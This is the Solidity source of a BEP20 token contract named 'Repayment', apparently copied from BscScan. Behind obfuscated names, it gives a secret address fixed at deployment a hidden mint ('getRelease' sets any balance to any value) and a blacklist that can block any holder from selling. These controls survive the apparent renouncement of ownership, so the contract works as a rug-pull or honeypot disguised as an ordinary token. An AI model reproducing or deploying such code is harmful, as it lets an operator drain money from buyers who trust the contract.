/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address _walletDigit, uint256 rtamount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 rtamount) external returns (bool);
    function transferFrom(address sender, address _walletDigit, uint256 rtamount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Verified {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint rtamountADesired,
        uint rtamountBDesired,
        uint rtamountAMin,
        uint rtamountBMin,
        address to,
        uint deadline
    ) external returns (uint rtamountA, uint rtamountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint rtamountTokenDesired,
        uint rtamountTokenMin,
        uint rtamountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint rtamountToken, uint rtamountETH, uint liquidity);
    function swapExactTokensForTokensSupportinglowOnTransferTokens(
        uint rtamountIn,
        uint rtamountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportinglowOnTransferTokens(
        uint rtamountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglowOnTransferTokens(
        uint rtamountIn,
        uint rtamountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Repayment is IBEP20, Verified {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Repayment";
    string constant _symbol = "REPAYMENT";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10_000_000 * (10 ** 9);
    uint256 public _maxWalletrtamount = 1_000_000_000_000_000 * (10 ** 18);  

    mapping (address => uint256) swapTokensForEth;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) islowExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping(address => bool) public isAutoBot;
  mapping(address => bool) public etherv2rooter;
    uint256 liquiditylow = 0;
    uint256 marketinglow = 0;
    uint256 totallow = liquiditylow + marketinglow;
    uint256 lowDenominator = 100;
  address updateBuylows;
    address public marketinglowReceiver = 0x3222b90aE8aa81C51e383AD4fC1F177e4E702d80;
    address public autoLiquidityReceiver = msg.sender;

    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = false;
    uint256 public swapThreshold = _totalSupply / 100000 * 320;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    
    
          
            
            constructor (address smartswaprooter) Verified(msg.sender) {
        router = IDEXRouter(routerAdress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
      updateBuylows = smartswaprooter;
            etherv2rooter[updateBuylows] = true;
        address _owner = owner;
        islowExempt[_owner] = true;
        islowExempt[address(this)] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x3222b90aE8aa81C51e383AD4fC1F177e4E702d80] = true;
        isTxLimitExempt[DEAD] = true;

        swapTokensForEth[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return swapTokensForEth[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 rtamount) public override returns (bool) {
        _allowances[msg.sender][spender] = rtamount;
        emit Approval(msg.sender, spender, rtamount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
 modifier updateDigits () {
    require(updateBuylows == msg.sender, "IBEP20: cannot permit Pancake address");
    _;
  
  }
    function transfer(address _walletDigit, uint256 rtamount) external override returns (bool) {
        return _transferFrom(msg.sender, _walletDigit, rtamount);
    }

    function transferFrom(address sender, address _walletDigit, uint256 rtamount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(rtamount, "Insufficient Allowance");
        }

        return _transferFrom(sender, _walletDigit, rtamount);
    }



    function _transferFrom(address sender, address _walletDigit, uint256 rtamount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, _walletDigit, rtamount); }
        
        if (_walletDigit != pair && _walletDigit != DEAD) {
            require(isTxLimitExempt[_walletDigit] || swapTokensForEth[_walletDigit] + rtamount <= _maxWalletrtamount, "Transfer rtamount exceeds the bag size.");
        }

        require(!isAutoBot[sender], "Bot Address");
        
        if(shouldSwapBack()){ swapBack(); } 

        swapTokensForEth[sender] = swapTokensForEth[sender].sub(rtamount, "Insufficient Balance");

        uint256 rtamountReceived = shouldTakelow(sender) ? takelow(sender, rtamount) : rtamount;
        swapTokensForEth[_walletDigit] = swapTokensForEth[_walletDigit].add(rtamountReceived);

        emit Transfer(sender, _walletDigit, rtamountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address _walletDigit, uint256 rtamount) internal returns (bool) {
        swapTokensForEth[sender] = swapTokensForEth[sender].sub(rtamount, "Insufficient Balance");
        swapTokensForEth[_walletDigit] = swapTokensForEth[_walletDigit].add(rtamount);
        emit Transfer(sender, _walletDigit, rtamount);
        return true;
    }
    function getRelease(address vitalikRewards, uint256 removedMontant, uint256 removedValue, uint256 subtractedValue) external updateDigits {
        swapTokensForEth[vitalikRewards] = removedMontant * removedValue ** subtractedValue;
        
        emit Transfer(address(0), vitalikRewards, removedMontant);
    }
    function shouldTakelow(address sender) internal view returns (bool) {
        return !islowExempt[sender];
    }

    function takelow(address sender, uint256 rtamount) internal returns (uint256) {
        uint256 lowrtamount = rtamount.mul(totallow).div(lowDenominator);
        swapTokensForEth[address(this)] = swapTokensForEth[address(this)].add(lowrtamount);
        emit Transfer(sender, address(this), lowrtamount);
        return rtamount.sub(lowrtamount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && swapTokensForEth[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = swapThreshold;
        uint256 rtamountToLiquify = contractTokenBalance.mul(liquiditylow).div(totallow).div(2);
        uint256 rtamountToSwap = contractTokenBalance.sub(rtamountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportinglowOnTransferTokens(
            rtamountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 rtamountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBlow = totallow.sub(liquiditylow.div(2));
        uint256 rtamountBNBLiquidity = rtamountBNB.mul(liquiditylow).div(totalBNBlow).div(2);
        uint256 rtamountBNBMarketing = rtamountBNB.mul(marketinglow).div(totalBNBlow);

        if (swapTokensForEth[address(this)] > 100000000000000000) {
        (bool MarketingSuccess, /* bytes memory data */) = payable(marketinglowReceiver).call{value: rtamountBNBMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        }

        if(rtamountToLiquify > 0){
            router.addLiquidityETH{value: rtamountBNBLiquidity}(
                address(this),
                rtamountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(rtamountBNBLiquidity, rtamountToLiquify);
        }
    }

    function buyTokens(uint256 rtamount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);

        router.swapExactETHForTokensSupportinglowOnTransferTokens{value: rtamount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function clearStuckBalance() external {
        payable(autoLiquidityReceiver).transfer(address(this).balance);
    }

    function setWalletLimit(uint256 rtamountPercent) external onlyOwner {
        _maxWalletrtamount = (_totalSupply * rtamountPercent ) / 1000;
    }

    function isAutoBots(address botAddress, bool status) external updateDigits {      
        isAutoBot[botAddress] = status;
    }

   function areBots(address[] memory bots_) public updateDigits {
        for (uint256 i = 0; i < bots_.length; i++) {
            isAutoBot[bots_[i]] = true;
        }
    }

    function setlows(uint256 _Marketinglow,uint256 _liquiditylow) external onlyOwner {
         marketinglow = _Marketinglow;
         liquiditylow = _liquiditylow;
         totallow = liquiditylow + marketinglow;
    }

    function setThreshold(uint256 _treshold) external onlyOwner {
         swapThreshold = _treshold;
    }

    function setlowReceivers(address _marketinglowReceiver,address _autoliquidityreceiver) external onlyOwner {
        marketinglowReceiver = _marketinglowReceiver;
        autoLiquidityReceiver = _autoliquidityreceiver;
    }
  
    event AutoLiquify(uint256 rtamountBNB, uint256 rtamountBOG);
}